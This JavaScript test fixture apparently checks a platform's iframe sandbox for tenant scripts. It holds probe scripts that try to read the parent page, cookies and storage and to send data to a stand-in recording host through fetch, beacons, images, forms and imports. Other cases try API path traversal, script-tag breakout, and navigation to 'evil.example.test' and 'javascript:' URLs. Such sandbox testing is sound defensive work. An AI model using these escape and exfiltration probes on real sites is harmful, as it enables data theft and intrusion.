// The scripts a hostile or careless tenant could write, one per case. Each runs inside the real sandboxed frame and
// reports what happened through the one door it has, the platform's own API. __APP__ and __OTHER__ are replaced by
// the test with the platform's origin and the origin of a server that records every request.

const FIND_OUT = `
  const results = {};
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  async function probe(name, work) {
    try { results[name] = { ok: true, value: await work() }; }
    catch (error) { results[name] = { ok: false, error: String((error && error.name) || error) }; }
  }
`;

export const CASES = {
  // Everything a script might try in order to reach the page around it, the network or the user.
  probes: `${FIND_OUT}
    platform.ready.then(async () => {
      await probe("parentDocument", () => window.parent.document.title);
      await probe("cookie", () => document.cookie);
      await probe("localStorage", () => localStorage.length);
      await probe("sessionStorage", () => sessionStorage.length);
      await probe("indexedDB", () => new Promise((resolve, reject) => {
        const request = indexedDB.open("x"); request.onsuccess = () => resolve("opened"); request.onerror = () => reject(new Error("blocked"));
      }));
      await probe("topNavigation", () => { window.top.location.href = "__OTHER__/top"; return "assigned"; });
      await probe("popup", () => { const w = window.open("__OTHER__/popup"); return w ? "opened" : null; });
      await probe("fetchOther", () => fetch("__OTHER__/fetch").then((r) => r.status));
      await probe("fetchOtherNoCors", () => fetch("__OTHER__/fetch2", { mode: "no-cors" }).then(() => "sent"));
      await probe("beacon", () => navigator.sendBeacon("__OTHER__/beacon", "x"));
      await probe("image", () => new Promise((resolve) => {
        const image = new Image(); image.onload = () => resolve("loaded"); image.onerror = () => resolve("blocked");
        image.src = "__OTHER__/image"; setTimeout(() => resolve("timeout"), 1500);
      }));
      await probe("css", () => new Promise((resolve) => {
        const link = document.createElement("link"); link.rel = "stylesheet"; link.href = "__OTHER__/style.css";
        link.onload = () => resolve("loaded"); link.onerror = () => resolve("blocked"); document.head.appendChild(link);
        setTimeout(() => resolve("timeout"), 1500);
      }));
      await probe("eval", () => eval("1 + 1"));
      await probe("newFunction", () => new Function("return 1")());
      await probe("setTimeoutString", () => new Promise((resolve) => {
        window.__ran = false; setTimeout("window.__ran = true", 0); setTimeout(() => resolve(window.__ran ? "ran" : "blocked"), 100);
      }));
      await probe("nestedFrame", () => new Promise((resolve) => {
        const frame = document.createElement("iframe"); frame.src = "__OTHER__/nested";
        frame.onload = () => resolve("loaded"); frame.onerror = () => resolve("blocked"); document.body.appendChild(frame);
        setTimeout(() => resolve("timeout"), 1500);
      }));
      await probe("form", () => {
        const form = document.createElement("form"); form.action = "__OTHER__/form"; form.method = "post";
        document.body.appendChild(form); form.submit(); return "submitted";
      });
      await probe("worker", () => new Promise((resolve) => {
        const worker = new Worker(URL.createObjectURL(new Blob(["postMessage(1)"])));
        worker.onmessage = () => resolve("ran"); worker.onerror = () => resolve("blocked");
        setTimeout(() => resolve("timeout"), 1500);
      }));
      await probe("webSocket", () => new Promise((resolve, reject) => {
        const socket = new WebSocket("ws://127.0.0.1:3101/"); socket.onerror = () => reject(new Error("blocked")); socket.onopen = () => resolve("open");
      }));
      await probe("dynamicImport", () => import("__OTHER__/module.js"));
      await probe("serviceWorker", () => navigator.serviceWorker.register("/sw.js"));
      await probe("alert", () => { alert("hello"); return "returned"; });
      await probe("documentDomain", () => { document.domain = "localhost"; return document.domain; });
      await probe("baseTag", () => { const base = document.createElement("base"); base.href = "__OTHER__/"; document.head.appendChild(base); return "added"; });
      // Reaching the platform: the data interface works; everything else of the platform does not.
      await probe("apiEcho", async () => (await platform.json("/echo")).data);
      await probe("apiPathEscape", () => platform.api("/../../private"));
      await probe("apiProtocolRelative", () => platform.api("//127.0.0.1:3101/x"));
      await probe("apiBackslash", () => platform.api("/\\\\evil"));
      await probe("directFetchOtherPage", () => fetch("__APP__/private").then((r) => r.text()));
      await probe("directFetchApiWithoutCors", () => fetch("__APP__/api/v1/echo", { credentials: "include" }).then((r) => r.status));
      await probe("overwritePlatform", () => { window.platform = null; return typeof window.platform; });
      await probe("token", () => JSON.stringify(Object.keys(platform)).length);
      await platform.json("/report", { method: "POST", json: { case: "probes", results } });
    });`,

  // A script that contains text which would end a script element, and one that is very large.
  breakout: `${FIND_OUT}
    const hostile = "</script><script>window.__broken = 1</script><!--";
    platform.ready.then(() => platform.json("/report", { method: "POST", json: { case: "breakout", results: {
      length: hostile.length, broken: typeof window.__broken } } }));`,
  big: `/*${"x".repeat(900_000)}*/ platform.ready.then(() => platform.json("/report", { method: "POST", json: { case: "big", results: { ok: true } } }));`,

  theme: `platform.ready.then((context) => {
      const root = document.documentElement; const style = getComputedStyle(root);
      return platform.json("/report", { method: "POST", json: { case: "theme", results: {
        accent: style.getPropertyValue("--color-accent"), evil: style.getPropertyValue("--evil"), radius: root.style.getPropertyValue("--radius-sm"),
        ready: root.hasAttribute("data-platform-ready"), colorScheme: root.style.colorScheme, context: Object.keys(context).sort(),
        hasToken: "token" in context, bodyColor: getComputedStyle(document.body).color } } });
    });`,

  resize: `document.body.innerHTML = '<div id="box" style="height:700px"></div>';
    platform.ready.then(() => setTimeout(() => { document.getElementById("box").style.height = "900px"; }, 800));`,

  navigate: `platform.ready.then(() => {
      platform.navigate("/apps/Sales__c/Home?tab=1");
      platform.navigate("//evil.example.test/x");
      platform.navigate("https://evil.example.test/");
      platform.navigate("/a/../b");
      platform.navigate("javascript:alert(1)");
      platform.navigate("/" + "a".repeat(400));
    });`,

  renewal: `${FIND_OUT}
    platform.ready.then(async () => {
      const first = (await platform.json("/echo")).data.authorization;
      await sleep(9000);
      const second = (await platform.json("/echo")).data.authorization;
      await platform.json("/report", { method: "POST", json: { case: "renewal", results: { first, second } } });
    });`,

  refused: `${FIND_OUT}
    platform.ready.then(async () => {
      await sleep(5600);
      await platform.json("/expire-all");
      const answer = (await platform.json("/expire-once")).data;
      await platform.json("/report", { method: "POST", json: { case: "refused", results: { authorization: answer.authorization } } });
    });`,

  selfNavigate: `platform.ready.then(() => { location.href = "__OTHER__/self"; });`,

  scriptError: `platform.ready.then(() => { throw new Error("secret customer name"); });`,
};
